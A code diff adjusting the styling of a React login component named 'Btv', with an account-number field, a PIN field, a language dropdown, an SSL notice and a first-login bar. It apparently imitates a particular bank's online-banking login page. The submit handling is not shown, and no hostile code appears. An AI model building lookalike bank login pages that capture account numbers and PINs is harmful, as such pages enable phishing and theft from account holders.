@@ -229,12 +229,13 @@ const Btv = () => {
                 minWidth: 0,
               }}
             >
-              <div style={{ padding: "20px 24px 20px" }}>
-                <h2 style={{ fontSize: 18, fontWeight: 600, margin: "0 0 14px", paddingBottom: 10, borderBottom: `1px solid ${CARD_BORDER}`, color: BTV_BLUE }}>
+              <div style={{ padding: "16px 20px 16px" }}>
+                <h2 style={{ fontSize: 16, fontWeight: 600, margin: "0 0 14px", color: BTV_BLUE }}>
                   {t.loginTitle}
                 </h2>
                 <input
                   type="text"
+                  className="btv-input"
                   placeholder={t.step1}
                   value={verfNr}
                   onChange={(e) => setVerfNr(e.target.value)}
@@ -244,6 +245,7 @@ const Btv = () => {
                 <div style={{ display: "flex", gap: 10, marginBottom: 16 }}>
                   <input
                     type="password"
+                    className="btv-input"
                     placeholder={t.pinPlaceholder}
                     value={pin}
                     onChange={(e) => setPin(e.target.value)}
@@ -255,15 +257,27 @@ const Btv = () => {
                       onClick={() => setLangOpen((p) => !p)}
                       style={{
                         ...inputStyle,
+                        padding: "0 0 0 12px",
                         cursor: "pointer",
                         display: "flex",
                         alignItems: "center",
                         justifyContent: "space-between",
                         textAlign: "left",
+                        height: 38,
                       }}
                     >
                       <span>{t.languageNames[langKeys.indexOf(language)]}</span>
-                      <ChevronDown size={16} color={BTV_BLUE} />
+                      <span style={{
+                        width: 38,
+                        height: 38,
+                        background: CARD_BG,
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        flexShrink: 0,
+                      }}>
+                        <ChevronDown size={16} color={BTV_BLUE} />
+                      </span>
                     </button>
                     {langOpen && (
                       <div
@@ -273,7 +287,7 @@ const Btv = () => {
                           left: 0,
                           right: 0,
                           background: "#fff",
-                          border: `1px solid ${BTV_BLUE}`,
+                          border: `1px solid ${CARD_BORDER}`,
                           zIndex: 50,
                         }}
                       >
@@ -301,7 +315,7 @@ const Btv = () => {
                   </div>
                 </div>
 
-                <p style={{ fontSize: 12, lineHeight: 1.5, margin: "0 0 18px", color: BTV_BLUE }}>
+                <p style={{ fontSize: 13, lineHeight: 1.5, margin: "0 0 18px", color: "#6b7a82" }}>
                   {t.sslText}
                 </p>
 
@@ -309,11 +323,12 @@ const Btv = () => {
                   <button
                     onClick={handleSubmit}
                     style={{
-                      background: BTV_BLUE,
+                      background: "#3785b3",
                       color: "#fff",
                       border: "none",
-                      padding: "10px 36px",
+                      padding: "14px 36px",
                       fontSize: 14,
+                      fontWeight: 700,
                       cursor: "pointer",
                       borderRadius: 2,
                       fontFamily: "inherit",
@@ -328,15 +343,20 @@ const Btv = () => {
               <div
                 style={{
                   marginTop: "auto",
-                  background: ERSTANMELDUNG_BG,
+                  background: "#668da3",
                   color: "#fff",
-                  padding: "12px 24px",
+                  display: "flex",
+                  alignItems: "stretch",
+                  justifyContent: "flex-end",
                   fontSize: 14,
-                  textAlign: "right",
+                  fontWeight: 700,
                   cursor: "default",
+                  minHeight: 44,
                 }}
               >
-                {t.firstLogin}
+                <div style={{ width: 1, background: "#fff" }} />
+                <div style={{ padding: "12px 24px" }}>{t.firstLogin}</div>
+                <div style={{ width: 1, background: "#fff" }} />
               </div>
             </div>
 
